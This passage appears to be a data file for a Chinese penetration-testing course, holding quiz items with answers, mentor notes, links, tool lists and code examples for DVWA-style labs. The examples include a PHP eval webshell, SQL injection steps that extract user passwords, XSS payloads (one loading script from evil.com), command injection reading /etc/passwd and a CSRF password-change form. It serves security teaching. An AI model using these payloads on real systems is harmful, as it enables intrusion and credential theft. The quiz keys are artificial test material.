      explanation: '修改注册表是Windows的提权方式之一。Linux常见提权方式包括：内核漏洞提权（如DirtyCow）、SUID文件提权、计划任务（Cron）提权、sudo配置错误提权、数据库提权、环境变量劫持等等。'
    },
    {
      id: 'vulh-11',
      type: 'single',
      question: '反弹Shell（Reverse Shell）的核心原理是什么？',
      options: ['攻击者连接目标', '目标主动连接攻击者', '使用SSH连接', '使用远程桌面'],
      correctIndex: 1,
      explanation: '反弹Shell是指目标主机主动连接攻击者的机器，将Shell的输入输出重定向到攻击者。通常用于目标在内网、有防火墙、目标没有公网IP等场景，让目标主动"反弹"回来。'
    },
    {
      id: 'vulh-12',
      type: 'multiple',
      question: '以下哪些属于内网渗透的基础操作？',
      options: ['内网存活主机探测', '端口转发/内网穿透', '哈希传递（Pass the Hash）', '横向移动'],
      correctIndices: [0, 1, 2, 3],
      explanation: '内网渗透是拿到一台机器权限后的进一步操作，包括：内网存活探测、端口扫描、端口转发/隧道搭建、哈希传递、票据攻击、横向移动、域渗透等等。内网渗透比外网渗透更复杂，也更考验综合能力。'
    },
  ],
  'vulhub': [
    {
      id: 'vuhb-1',
      type: 'single',
      question: 'Vulhub的特点是什么？',
      options: ['在线靶场', '基于Docker的漏洞复现环境，一键启动', '需要付费', '只能在Windows运行'],
      correctIndex: 1,
      explanation: 'Vulhub是基于Docker和Docker Compose的漏洞环境集合，进入对应目录执行docker-compose up即可一键启动漏洞环境，非常方便进行漏洞复现学习。'
    },
    {
      id: 'vuhb-2',
      type: 'multiple',
      question: '以下哪些属于Web框架/组件漏洞？',
      options: ['ThinkPHP RCE', 'Struts2 S2系列漏洞', 'Log4j2 RCE', 'SQL注入'],
      correctIndices: [0, 1, 2],
      explanation: 'ThinkPHP、Struts2、Log4j2都属于框架/组件漏洞，是第三方代码的问题。SQL注入是应用层漏洞，是开发者代码写得有问题。'
    },
    {
      id: 'vuhb-3',
      type: 'single',
      question: 'Docker的核心优势是什么？',
      options: ['比虚拟机更省资源，启动更快', '更安全', '界面更好看', '只能运行Web服务'],
      correctIndex: 0,
      explanation: 'Docker容器相比虚拟机更轻量，启动更快（秒级启动），资源占用更少。一个普通机器可以同时运行几十个Docker容器，但运行几台虚拟机就很卡了。'
    },
    {
      id: 'vuhb-4',
      type: 'single',
      question: 'CVE的全称是什么？',
      options: ['Common Vulnerabilities and Exposures', 'Computer Virus Encyclopedia', 'Critical Vulnerability Exploits', 'Cyber Vulnerability Expert'],
      correctIndex: 0,
      explanation: 'CVE = Common Vulnerabilities and Exposures（通用漏洞披露），是公开披露信息安全漏洞的一个标准。每个CVE都有一个唯一编号，如CVE-2021-44228（Log4j2）。'
    },
    {
      id: 'vuhb-5',
      type: 'boolean',
      question: '漏洞复现只是为了好玩，对学习安全没什么帮助？',
      options: ['正确', '错误'],
      correctIndex: 1,
      explanation: '漏洞复现是安全学习的重要方法。通过亲手复现，可以深入理解漏洞原理、影响范围、利用条件和修复方案。光看文章理解不深，动手复现印象才深刻。'
    },
    {
      id: 'vuhb-6',
      type: 'multiple',
      question: '以下哪些是经典的中间件漏洞？',
      options: ['Apache解析漏洞', 'Nginx解析漏洞', 'Tomcat弱口令+WAR包', 'WordPress插件漏洞'],
      correctIndices: [0, 1, 2],
      explanation: 'Apache解析漏洞、Nginx解析漏洞、Tomcat管理后台弱口令+WAR包上传都是经典的中间件漏洞。WordPress是CMS（内容管理系统），不属于中间件。'
    },
    {
      id: 'vuhb-7',
      type: 'single',
      question: 'Docker Compose的作用是什么？',
      options: ['Docker的图形化界面', '定义和运行多容器Docker应用的工具', 'Docker的安装程序', '监控Docker的工具'],
      correctIndex: 1,
      explanation: 'Docker Compose是用于定义和运行多容器Docker应用的工具。通过一个YAML文件（docker-compose.yml）配置应用的所有服务，然后用一条命令启动所有服务。'
    },
    {
      id: 'vuhb-8',
      type: 'single',
      question: 'Log4j2漏洞（Log4Shell）为什么影响这么大？',
      options: ['因为名字好听', 'Log4j2应用极广，且利用简单危害大', '只影响Windows', '是新漏洞'],
      correctIndex: 1,
      explanation: 'Log4j2是Java生态中使用最广泛的日志库，几乎所有Java应用都在用。漏洞利用非常简单（只要输入${jndi:...}），且直接远程代码执行（RCE），所以影响极大。'
    },
    {
      id: 'vuhb-9',
      type: 'multiple',
      question: '以下哪些是Docker的常用命令？',
      options: ['docker ps', 'docker exec', 'docker images', 'docker compose'],
      correctIndices: [0, 1, 2, 3],
      explanation: 'docker ps查看容器、docker exec进入容器、docker images查看镜像、docker compose（或docker-compose）编排多容器应用，这些都是Docker的常用命令。学Vulhub必须熟练掌握Docker基础。'
    },
    {
      id: 'vuhb-10',
      type: 'single',
      question: '以下哪个不属于框架/组件漏洞？',
      options: ['ThinkPHP RCE', 'Struts2 OGNL注入', 'SQL注入', 'Log4j2 JNDI注入'],
      correctIndex: 2,
      explanation: 'SQL注入是应用层漏洞，是开发者代码写得有问题。ThinkPHP、Struts2、Log4j2都属于第三方框架/组件漏洞，是第三方代码的问题，只要用了这个组件就可能中招，影响范围更广。'
    },
    {
      id: 'vuhb-11',
      type: 'multiple',
      question: '以下哪些属于常见的中间件漏洞？',
      options: ['Apache解析漏洞', 'Nginx解析漏洞', 'Tomcat管理后台弱口令', 'WordPress插件漏洞'],
      correctIndices: [0, 1, 2],
      explanation: 'Apache、Nginx、Tomcat都属于中间件（Web服务器/应用服务器），它们的漏洞属于中间件漏洞。WordPress是CMS（内容管理系统），属于应用层软件，不属于中间件。'
    },
    {
      id: 'vuhb-12',
      type: 'single',
      question: 'CVE编号的格式是CVE-年份-序号，以下关于CVE的说法正确的是？',
      options: ['CVE编号是按发现顺序随机分配的', 'CVE编号的序号数字越大说明漏洞越新越严重', '每个CVE对应一个唯一的公开漏洞', 'CVE只包含Web漏洞'],
      correctIndex: 2,
      explanation: 'CVE（Common Vulnerabilities and Exposures）是通用漏洞披露标准，每个CVE编号对应一个唯一的公开漏洞。序号数字不代表严重程度，只代表分配顺序。CVE涵盖各种类型的漏洞，不只是Web漏洞。'
    },
  ],
};

/* ==================== 分阶段大神笔记 ==================== */
const expertNotesByPhase: Record<string, { author: string; title: string; content: string; url?: string }[]> = {
  'env': [
    {
      author: '老安全',
      title: '环境搭建是安全学习的第一步，也是最重要的一步',
      content: '很多新手急于学漏洞，却忽略了环境搭建的重要性。实际上，90%的入门卡壳都出在环境问题上。把环境搭熟了，后面学漏洞才能事半功倍。我的建议是：PHPStudy装3遍，DVWA搭5遍，直到不用看教程也能搞定。这个时间花得绝对值。',
    },
    {
      author: '渗透老兵',
      title: '工具不在多，在于精',
      content: '新手容易陷入"收集工具癖"，硬盘存了几百G工具，真正用的就那几个。Burp Suite、sqlmap、AntSword这三个工具，足够应对80%的Web渗透场景。把这三个工具玩透，比收集100个工具有用得多。工具是手段，思维才是核心。',
    },
    {
      author: 'Web安全研究员',
      title: '为什么一定要本地搭靶场？',
      content: '有人说现在在线靶场很多，为什么还要本地搭？因为本地靶场你有完全控制权，可以看源码、改配置、调试漏洞，理解才深刻。在线靶场只能黑盒测试，本地靶场可以黑白结合，学习效率差好几倍。',
    },
    {
      author: '老安全',
      title: '学习安全的正确姿势',
      content: '安全学习的路径是：理论 → 实践 → 复盘 → 再实践。不要只看教程不动手，也不要只会打脚本不会原理。最好的方式是：先理解原理 → 亲手操作 → 总结笔记 → 过段时间再复现一次。这样学过的东西才是你的。',
    },
    {
      author: '网络安全讲师',
      title: 'HTTP协议是Web安全的基石',
      content: '很多新手一上来就学漏洞，却忽略了HTTP协议的基础。实际上，Web渗透的本质就是在和HTTP协议打交道。请求方法、状态码、请求头、Cookie、Session……这些概念吃透了，学起漏洞来才能举一反三。建议花一天时间把HTTP协议彻底搞懂，绝对值得。',
    },
    {
      author: '运维安全工程师',
      title: '虚拟机和快照是你的好朋友',
      content: '学安全一定要会用虚拟机，VMware或VirtualBox都行。更重要的是学会用快照——搭好环境拍个快照，装完工具拍个快照，打靶前拍个快照，打坏了直接回滚。别嫌麻烦，等你把环境搞崩又要重装的时候，你就知道快照有多香了。',
    },
  ],
  'dvwa': [
    {
      author: '老安全',
      title: 'DVWA Low级别通关只是开始',
      content: '很多人通关Low级别就觉得学会了，这是最大的误区。Low级别是给你理解漏洞原理的，Medium才是入门，High才接近实战。一定要把四个难度都通关，并且理解每个难度的过滤逻辑区别。理解防御，才能更好地理解攻击。',
    },
    {
      author: 'Web安全研究员',
      title: '源码审计比黑盒测试更重要',
      content: 'DVWA的价值不仅在于练手，更在于有源码可以对照。每做一关，建议都去看一下对应的PHP源码，理解漏洞是怎么产生的，过滤代码哪里有缺陷。这个习惯能让你进步快3倍。攻防是一体两面，懂代码才能懂漏洞。',
    },
    {
      author: '注入大师',
      title: '每学一个漏洞，都要问自己三个问题',
      content: '1. 漏洞原理是什么？为什么会产生？2. 利用条件是什么？什么情况下能用？3. 怎么防御？最好的防御方案是什么？能回答这三个问题，才算真正掌握了这个漏洞。否则只是会用payload的脚本小子。',
    },
    {
      author: '渗透老兵',
      title: 'DVWA通关后应该达到什么水平？',
      content: 'DVWA全部通关后，你应该能做到：1. 看到一个功能点，能快速判断可能存在哪些漏洞；2. 对每种漏洞的原理和利用方法了然于胸；3. 知道基本的防御思路。达到这个水平，就可以去玩更复杂的靶场了。',
    },
    {
      author: 'XSS攻防专家',
      title: 'XSS不是只有弹窗，危害比你想象的大',
      content: '新手学XSS，总觉得弹个窗就完事了。实际上XSS的危害非常大：窃取Cookie登录后台、劫持用户操作、钓鱼攻击、键盘记录、甚至结合浏览器漏洞getshell。弹窗只是证明漏洞存在，真正的利用才是重点。学习XSS要深入理解浏览器同源策略、CSP绕过等知识。',
    },
    {
      author: '代码审计员',
      title: '从攻击者视角看代码，漏洞一目了然',
      content: '学漏洞学到一定程度，要学会从攻击者的视角看代码。看到一个输入框，先想：这个输入会传到哪里？会拼接到SQL吗？会输出到HTML吗？会传给命令执行函数吗？会反序列化吗？带着攻击者的思维看代码，漏洞就藏不住。',
    },
  ],
  'sqli': [
    {
      author: '注入大师',
      title: 'SQL注入的精髓是"理解数据库的思维"',
      content: '很多人背了一堆payload，换个场景就不会了。核心原因是没有理解SQL语句的执行逻辑。我的建议是：每注入一个payload，都在脑子里拼一遍完整的SQL语句，想象数据库会怎么执行。想明白了，payload自然就会写了。注入的是思维，不是payload。',
    },
    {
      author: '老安全',
      title: '手工注入是基础，sqlmap是工具',
      content: '一定要先练手工注入，再用sqlmap。手工注入能让你理解注入的本质，sqlmap只是提高效率的工具。只会用sqlmap的人，遇到WAF就束手无策；懂手工注入的人，才能灵活绕过。记住：工具是手的延伸，但手本身要有力。',
    },
    {
      author: 'Web安全研究员',
      title: '盲注练习的三个境界',
      content: '第一层：用工具跑（sqlmap），能出结果就行。第二层：手工写脚本跑，理解盲注逻辑。第三层：能手算盲注，对每一步的判断了然于心。到了第三层，任何SQL注入题目都难不倒你。',
    },
    {
      author: '渗透老兵',
      title: '为什么SQL注入至今仍是头号漏洞？',
      content: '虽然预编译已经普及，但SQL注入仍然是最常见的高危漏洞之一。原因是：1. 很多老系统没有用预编译；2. 表名、列名、order by等地方无法使用预编译；3. 框架使用不当仍然会注入；4. 开发安全意识不足。永远不要轻视SQL注入。',
    },
    {
      author: 'SQL注入研究员',
      title: '二次注入和宽字节注入：绕过防御的艺术',
      content: '当常规注入行不通时，就要考虑一些"非主流"注入方式。二次注入利用了"数据入库时安全，出库时不安全"的逻辑漏洞；宽字节注入利用了字符编码不一致的问题。这些注入方式更考验对原理的理解。记住：过滤不代表安全，安全是一个系统工程。',
    },
    {
      author: 'CTF选手',
      title: 'sqlmap是工具，不是答案',
      content: '很多人学SQL注入，上来就用sqlmap跑，跑出来就觉得会了。但遇到WAF、遇到过滤、遇到盲注就懵了。我的建议是：先手工注入练到能熟练写脚本，再用sqlmap。工具只是提高效率的，不能替代你对原理的理解。真正的高手，即使不用工具也能注入。',
    },
  ],
  'upload': [
    {
      author: '上传绕过专家',
      title: '文件上传的核心是"信任边界"',
      content: '所有上传绕过的本质，都是在寻找开发者的信任边界——开发者认为什么是安全的？是后缀名？是MIME类型？还是文件内容？找到这个边界，就能找到绕过方法。做上传题的时候，多问自己：开发者信任了什么？这个信任可靠吗？',
    },
    {
      author: 'Web安全研究员',
      title: '绕过不是目的，理解防御才是',
      content: '练习上传绕过的时候，不要只想着"怎么传上去"。多想想：如果你是开发者，你会怎么防御？哪些防御是有效的？哪些可以被绕过？攻防一体，才能真正理解安全。将来做防守的时候，你才知道攻方会怎么想。',
    },
    {
      author: '老安全',
      title: '文件上传漏洞的三层防御体系',
      content: '第一层：后缀白名单+文件内容检测。第二层：上传目录不可执行（存到独立域名或独立存储）。第三层：文件重命名+权限控制。三层都做到，文件上传基本就安全了。任何单一防御都可能被绕过，纵深防御才是王道。',
    },
    {
      author: '渗透老兵',
      title: 'WebShell工具怎么选？',
      content: '新手推荐从蚁剑开始，界面友好功能全。进阶可以用哥斯拉，内存马、加密传输功能更强。菜刀比较老了，不推荐。但工具只是工具，核心是理解WebShell的原理——一句话木马为什么能执行代码？理解了原理，你自己都能写WebShell。',
    },
    {
      author: 'WAF规则工程师',
      title: '文件上传防御：纵深防御才是王道',
      content: '很多人以为加个文件头检查就安全了，其实远远不够。完整的文件上传防御应该包括：1. 后缀白名单（不是黑名单）；2. 文件内容检测（不能只检查文件头）；3. 文件重命名（随机化）；4. 上传目录不可执行；5. 独立域名或存储。任何单一防御都可能被绕过，层层防护才安全。',
    },
    {
      author: 'CTF上传绕过专家',
      title: '二次渲染绕过：和图片处理算法斗智斗勇',
      content: '二次渲染是上传绕过中比较难的一类，因为服务器会重新生成图片。但再复杂的渲染算法，也总会有一些区域保持不变。比如GIF的某些帧、PNG的注释块、JPG的EXIF信息等。绕过思路就是找到这些"安全区"，把代码藏进去。多试几种图片格式，总能找到突破口。',
    },
  ],
  'pikachu': [
    {
      author: '老安全',
      title: 'Pikachu是最好的综合训练场',
      content: 'DVWA是按漏洞类型分类的，Pikachu更接近真实场景。做完DVWA再来做Pikachu，你会发现：真实场景中漏洞不是孤立的，往往需要组合利用。比如：XSS打Cookie → 进后台 → 文件上传 → Getshell。这就是从"会漏洞"到"会渗透"的关键一步。',
    },
    {
      author: '渗透老兵',
      title: '从"知道漏洞"到"找到漏洞"的跨越',
      content: 'DVWA是告诉你这里有SQL注入，你去利用。但真实场景中没人告诉你哪里有漏洞。Pikachu的价值就在于：你需要自己去发现漏洞——哪个页面可能有注入？哪个功能可能有XSS？这种主动寻找漏洞的思维，比学会100个payload都重要。',
    },
    {
      author: 'Web安全研究员',
      title: '反序列化为什么这么难？',
      content: '反序列化漏洞之所以难，是因为它需要理解目标语言的对象模型和魔法方法。但别怕，核心思路是一样的：1. 找到可控的反序列化点；2. 找到可以利用的POP链；3. 构造恶意序列化数据。多练几个CVE，慢慢就有感觉了。',
    },
    {
      author: 'SSRF研究员',
      title: 'SSRF：从内网探测到GetShell的进阶之路',
      content: '新手学SSRF，往往只知道探测内网端口。但SSRF的威力远不止于此：file://读文件、dict://探测服务、gopher://打Redis/Mysql/FastCGI、甚至打内网的Web应用。SSRF就像一把钥匙，能帮你打开内网的大门。关键在于理解不同协议的利用方式。',
    },
    {
      author: '越权漏洞猎手',
      title: '越权漏洞：最容易被忽略的高危漏洞',
      content: '越权漏洞不像SQL注入、XSS那么出名，但实际危害非常大，而且特别常见。因为越权本质是业务逻辑缺陷，自动化工具很难扫出来。测试越权的思路很简单：拿A用户的Cookie去访问B用户的数据，拿普通用户的Cookie去访问管理员的功能。每个需要权限的接口都值得测一测。',
    },
  ],
  'vulnhub': [
    {
      author: '渗透老兵',
      title: '打靶机的正确姿势',
      content: '打VulnHub靶机，不要一上来就查writeup。给自己设定时间：先独立打2小时，实在没思路再看提示，看完提示再自己打，最后再看完整writeup。这样练10台靶机，比照着writeup打100台进步都大。独立思考的过程是最宝贵的。',
    },
    {
      author: '老安全',
      title: '信息收集占渗透测试的80%',
      content: '很多新手打靶机，一上来就找漏洞，结果半天没进展。实际上，80%的时间都应该花在信息收集上。端口、服务、版本、目录、参数、CMS类型、注释信息……信息收集越全面，找到突破口的概率就越大。磨刀不误砍柴工。',
    },
    {
      author: '提权专家',
      title: '提权的核心思路：枚举+利用',
      content: '提权不是瞎试，而是系统地枚举。Linux提权：内核版本、SUID文件、sudo权限、计划任务、可写文件、数据库密码、历史命令……一项项枚举过去，总能找到突破口。Windows提权同理：内核漏洞、服务权限、注册表、AlwaysInstallElevated等等。',
    },
    {
      author: '安全研究员',
      title: '每打完一台靶机，一定要做复盘',
      content: '打完靶机不是拿到flag就完了，一定要复盘：1. 自己走了哪些弯路？2. 有哪些点没想到？3. 还有没有其他方法？4. 防御方应该怎么防？写个简单的笔记，比打10台靶机都管用。',
    },
    {
      author: '内网渗透专家',
      title: '拿到Shell只是开始，内网才是重头戏',
      content: '很多新手觉得拿到Shell就结束了，实际上拿到Shell只是内网渗透的第一步。接下来还要：内网存活探测、端口扫描、横向移动、权限维持、域渗透等等。外网打进去靠的是漏洞，内网打穿靠的是思路和耐心。内网的世界比你想象的大得多。',
    },
    {
      author: '反弹shell狂魔',
      title: '反弹Shell：每个渗透测试者的必备技能',
      content: '反弹Shell看起来简单，但实际场景中经常遇到各种问题：没有nc、没有python、防火墙拦截、bash版本不支持/dev/tcp……我的建议是：至少熟练掌握5种以上的反弹Shell方法，遇到不同环境才能灵活应对。实在不行，还可以上传静态编译的nc。',
    },
  ],
  'vulhub': [
    {
      author: '安全研究员',
      title: 'Vulhub是漏洞复现的最佳工具',
      content: '学安全一定要动手复现漏洞，光看文章理解不深。Vulhub把各种经典漏洞都做成了Docker环境，一条命令就能启动。我的建议是：每个经典CVE漏洞都自己复现一遍，理解漏洞原理、影响范围、利用条件和修复方案。',
    },
    {
      author: '老安全',
      title: '复现漏洞的三层境界',
      content: '第一层：照着教程打，跑通payload，知道怎么利用。第二层：理解漏洞原理，能自己修改payload，知道什么时候能用什么时候不能用。第三层：思考修复方案，能写防御代码，甚至能挖变种。你现在在哪一层？',
    },
    {
      author: '渗透老兵',
      title: '框架漏洞和应用漏洞的区别',
      content: '应用漏洞（SQL注入、XSS等）是开发者代码写得有问题，每个网站都不一样。框架漏洞（ThinkPHP、Struts2、Log4j2等）是第三方组件的问题，只要用了这个组件就可能中招，影响范围特别广。渗透测试中框架漏洞往往是突破口。',
    },
    {
      author: 'Web安全研究员',
      title: '学Docker是为了什么？',
      content: '学Docker不只是为了跑Vulhub，Docker是现代运维的基础技能。做安全的懂Docker，做代码审计的懂开发，做渗透的懂运维——知识面越广，你的天花板就越高。安全是一个综合性极强的领域，永远保持学习。',
    },
    {
      author: '漏洞研究员',
      title: '从漏洞复现到漏洞挖掘，只差一步',
      content: '很多人觉得漏洞挖掘是大佬的事，自己只会复现。其实不然：复现多了，你就会理解漏洞产生的根本原因；理解了根本原因，你就会想：还有没有类似的场景？这个思路能不能用到其他地方？带着问题去看代码，说不定你也能挖到0day。从复现到挖掘，是一个从量变到质变的过程。',
    },
    {
      author: 'CVE分析师',
      title: '关注CVE，就是关注安全行业的脉搏',
      content: '每个严重的CVE漏洞，都是一次学习的机会。不要只收藏不看，每个重要的CVE都应该亲手复现一遍：理解原理、影响范围、利用条件、修复方案。看得多了，你对漏洞的敏感度会越来越高，也更容易发现新的漏洞。关注CVE，就是关注安全行业的脉搏。',
    },
  ],
};

/* ==================== 分阶段学习资源 ==================== */
const resourcesByPhase: Record<string, { name: string; url: string; type: 'article' | 'video' | 'book' }[]> = {
  'env': [
    { name: 'PHPStudy官方手册', url: 'https://www.xp.cn/', type: 'article' },
    { name: 'MDN Web安全文档', url: 'https://developer.mozilla.org/zh-CN/docs/Web/Security', type: 'article' },
    { name: 'Burp Suite官方教程', url: 'https://portswigger.net/web-security', type: 'article' },
    { name: 'OWASP官方网站', url: 'https://owasp.org/', type: 'article' },
    { name: 'Web安全深度剖析', url: 'https://book.douban.com/subject/26777822/', type: 'book' },
    { name: '白帽子讲Web安全', url: 'https://book.douban.com/subject/10546925/', type: 'book' },
  ],
  'dvwa': [
    { name: 'DVWA官方文档', url: 'https://dvwa.co.uk/', type: 'article' },
    { name: 'OWASP Top 10 2021', url: 'https://owasp.org/www-project-top-ten/', type: 'article' },
    { name: 'Web安全深度剖析', url: 'https://book.douban.com/subject/26777822/', type: 'book' },
    { name: 'SQL注入天书', url: 'https://www.cnblogs.com/lcamry/category/850970.html', type: 'article' },
    { name: 'XSS跨站脚本攻击剖析与防御', url: 'https://book.douban.com/subject/24388206/', type: 'book' },
    { name: 'FreeBuf安全社区', url: 'https://www.freebuf.com/', type: 'article' },
  ],
  'sqli': [
    { name: 'SQL注入天书', url: 'https://www.cnblogs.com/lcamry/category/850970.html', type: 'article' },
    { name: 'sqlmap官方Wiki', url: 'https://github.com/sqlmapproject/sqlmap/wiki', type: 'article' },
    { name: 'SQL注入攻击与防御', url: 'https://book.douban.com/subject/25730194/', type: 'book' },
    { name: 'Web安全深度剖析', url: 'https://book.douban.com/subject/26777822/', type: 'book' },
    { name: 'SQLi-Labs教程汇总', url: 'https://www.freebuf.com/column/146505.html', type: 'article' },
    { name: '先知社区-注入专题', url: 'https://xz.aliyun.com/', type: 'article' },
  ],
  'upload': [
    { name: '文件上传绕过小结', url: 'https://www.cnblogs.com/ECJTUACM-873284962/p/9657229.html', type: 'article' },
    { name: 'Webshell管理工具对比', url: 'https://www.freebuf.com/sectool/207295.html', type: 'article' },
    { name: 'Upload-Labs通关笔记', url: 'https://github.com/Mochazz/ThinkPHP-Vuln', type: 'article' },
    { name: '文件上传漏洞总结', url: 'https://0xsec.top/2020/05/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/', type: 'article' },
    { name: '白帽子讲Web安全', url: 'https://book.douban.com/subject/10546925/', type: 'book' },
  ],
  'pikachu': [
    { name: 'Pikachu官方仓库', url: 'https://github.com/zhuifengshaonianhanlu/pikachu', type: 'article' },
    { name: 'OWASP XSS详解', url: 'https://owasp.org/www-community/attacks/xss/', type: 'article' },
    { name: 'CSRF攻击原理与防御', url: 'https://www.freebuf.com/articles/web/56172.html', type: 'article' },
    { name: 'PHP反序列化入门', url: 'https://www.freebuf.com/articles/web/166385.html', type: 'article' },
    { name: 'SSRF漏洞详解', url: 'https://www.freebuf.com/articles/web/223815.html', type: 'article' },
    { name: 'XXE漏洞学习', url: 'https://www.freebuf.com/articles/web/187122.html', type: 'article' },
  ],
  'vulnhub': [
    { name: 'VulnHub官网', url: 'https://www.vulnhub.com/', type: 'article' },
    { name: 'Nmap官方指南', url: 'https://nmap.org/book/man.html', type: 'article' },
    { name: '渗透测试入门指南', url: 'https://www.hackerone.com/ethical-hacker/penetration-testing-guide', type: 'article' },
    { name: 'Metasploit官方教程', url: 'https://www.metasploit.com/', type: 'article' },
    { name: 'Kali Linux官方文档', url: 'https://www.kali.org/docs/', type: 'article' },
    { name: 'Linux提权指南', url: 'https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/', type: 'article' },
  ],
  'vulhub': [
    { name: 'Vulhub官方文档', url: 'https://vulhub.org/', type: 'article' },
    { name: 'Docker从入门到实践', url: 'https://yeasy.gitbook.io/docker_practice/', type: 'book' },
    { name: 'NVD漏洞库', url: 'https://nvd.nist.gov/vuln/search', type: 'article' },
    { name: 'CNNVD国家漏洞库', url: 'http://www.cnnvd.org.cn/', type: 'article' },
    { name: 'Log4j2漏洞详解', url: 'https://www.freebuf.com/vuls/309502.html', type: 'article' },
    { name: 'Struts2漏洞汇总', url: 'https://www.freebuf.com/column/162381.html', type: 'article' },
  ],
};

/* ==================== 分阶段推荐工具 ==================== */
const toolsByPhase: Record<string, { name: string; description: string; url: string; type: 'local' | 'online' | 'browser' }[]> = {
  'env': [
    { name: 'PHPStudy', description: 'Web环境集成软件，一键搭建PHP+MySQL+Apache', url: 'https://www.xp.cn/', type: 'local' },
    { name: 'Burp Suite', description: 'Web渗透测试必备抓包工具', url: 'https://portswigger.net/burp', type: 'local' },
  ],
  'dvwa': [
    { name: 'HackBar', description: '浏览器插件，SQL注入/XSS测试辅助工具', url: 'https://addons.mozilla.org/firefox/addon/hackbar/', type: 'browser' },
    { name: 'AntSword（蚁剑）', description: 'WebShell管理工具，支持多种语言一句话木马', url: 'https://github.com/AntSwordProject/antSword', type: 'local' },
    { name: 'Wappalyzer', description: '浏览器插件，识别网站技术栈', url: 'https://www.wappalyzer.com/', type: 'browser' },
  ],
  'sqli': [
    { name: 'sqlmap', description: '自动化SQL注入工具，支持多种数据库', url: 'https://sqlmap.org/', type: 'local' },
    { name: 'Tamper Data', description: 'Firefox插件，查看和修改HTTP请求', url: 'https://addons.mozilla.org/firefox/addon/tamper-data/', type: 'browser' },
  ],
  'upload': [
    { name: 'Godzilla（哥斯拉）', description: 'WebShell管理工具，内存马功能强大', url: 'https://github.com/BeichenDream/Godzilla', type: 'local' },
    { name: 'GIF图片处理工具', description: '用于制作图片马和二次渲染绕过测试', url: 'https://www.xp.cn/', type: 'local' },
  ],
  'pikachu': [
    { name: 'Postman', description: 'API测试工具，构造各种HTTP请求', url: 'https://www.postman.com/', type: 'local' },
    { name: 'XSS平台', description: 'XSS测试平台，接收Cookie等数据', url: 'https://xss.pt/', type: 'online' },
  ],
  'vulnhub': [
    { name: 'VMware Workstation', description: '虚拟机软件，运行VulnHub靶机', url: 'https://www.vmware.com/products/workstation-pro.html', type: 'local' },
    { name: 'Nmap', description: '端口扫描和服务发现工具', url: 'https://nmap.org/', type: 'local' },
    { name: 'Metasploit', description: '渗透测试框架，漏洞利用集大成者', url: 'https://www.metasploit.com/', type: 'local' },
    { name: 'DirBuster', description: '目录扫描工具，发现隐藏页面', url: 'https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project', type: 'local' },
  ],
  'vulhub': [
    { name: 'Docker', description: '容器化技术，快速部署漏洞环境', url: 'https://www.docker.com/', type: 'local' },
    { name: 'Docker Compose', description: '多容器编排工具', url: 'https://docs.docker.com/compose/', type: 'local' },
    { name: 'Exploit-DB', description: '漏洞利用数据库，查找POC和EXP', url: 'https://www.exploit-db.com/', type: 'online' },
  ],
};

/* ==================== 分阶段代码示例 ==================== */
const codeExamplesByPhase: Record<string, { title: string; language: string; code: string; explanation: string }[]> = {
  'env': [
    {
      title: 'PHP一句话木马（最基础的WebShell）',
      language: 'php',
      code: `<?php
// 一句话木马：客户端通过POST发送cmd参数，服务器执行命令
// 蚁剑/哥斯拉等工具可以连接这个文件
@eval($_POST['cmd']);
?>`,
      explanation: '最经典的PHP一句话木马。eval()函数执行PHP代码，$_POST["cmd"]接收客户端POST提交的参数。@符号用于抑制错误输出。'
    },
    {
      title: 'Burp Suite修改请求示例',
      language: 'http',
      code: `GET /dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: security=low; PHPSESSID=abc123`,
      explanation: 'Burp Suite拦截的HTTP请求。可以修改参数、Cookie、请求头等内容，然后Forward发送给服务器。这是Web渗透的基本操作。'
    },
    {
      title: 'HTTP请求报文结构详解',
      language: 'http',
      code: `POST /login.php HTTP/1.1         # 请求行：方法 + URL + 协议版本
Host: example.com                  # 请求头：Host
User-Agent: Mozilla/5.0            # 请求头：浏览器标识
Accept: text/html,application/json # 请求头：可接受的内容类型
Content-Type: application/x-www-form-urlencoded # 请求头：POST数据类型
Content-Length: 27                 # 请求头：POST数据长度
Cookie: PHPSESSID=abc123           # 请求头：Cookie

username=admin&password=123456     # 请求体：POST数据`,
      explanation: '完整的HTTP请求报文结构，分为请求行、请求头、空行、请求体四部分。理解HTTP报文结构是Web渗透的基础，Burp抓包改包就是在操作这些内容。'
    },
  ],
  'dvwa': [
    {
      title: 'SQL注入：联合查询注入基本步骤',
      language: 'sql',
      code: `-- 1. 测试注入点（单引号）
1'

-- 2. 测试列数（order by）
1' order by 3-- 

-- 3. 联合查询找显示位
1' union select 1,2,3-- 

-- 4. 查询数据库名
1' union select 1,database(),3-- 

-- 5. 查询表名
1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- 

-- 6. 查询列名
1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'-- 

-- 7. 查数据
1' union select 1,username,password from users-- `,
      explanation: '联合查询注入的经典步骤：测试注入点→测列数→找显示位→查库名→查表名→查列名→查数据。这是SQL注入的基本功。'
    },
    {
      title: 'XSS：三种基本类型演示',
      language: 'html',
      code: `<!-- 反射型XSS：参数直接输出到页面 -->
<script>alert(document.cookie)</script>

<!-- 存储型XSS：提交后存在数据库，每次访问触发 -->
<script src="http://evil.com/xss.js"></script>

<!-- DOM型XSS：前端JS操作DOM导致 -->
<img src=x onerror=alert(1)>`,
      explanation: 'XSS的三种基本类型。反射型在URL参数中，存储型存在数据库里，DOM型完全在前端触发。防御方法是输出编码和CSP策略。'
    },
    {
      title: '命令注入：常用命令连接符',
      language: 'bash',
      code: `# 原始命令：ping -c 1 $ip
# 注入payload：127.0.0.1; whoami

# ;  顺序执行
127.0.0.1; id

# && 前面成功才执行后面
127.0.0.1 && whoami

# |  管道，前面的输出作为后面的输入
127.0.0.1 | ls

# || 前面失败才执行后面
127.0.0.0 || cat /etc/passwd`,
      explanation: '命令注入中常用的连接符：; && || | 等。根据过滤情况选择合适的连接符。实战中还可以用换行符、反引号等方式绕过。'
    },
    {
      title: 'CSRF PoC：自动提交表单',
      language: 'html',
      code: `<!-- CSRF攻击页面：受害者访问后自动提交修改密码请求 -->
<html>
<body>
  <form id="csrfForm" action="http://target.com/change_password.php" method="POST">
    <input type="hidden" name="password" value="hacked123" />
    <input type="hidden" name="confirm" value="hacked123" />
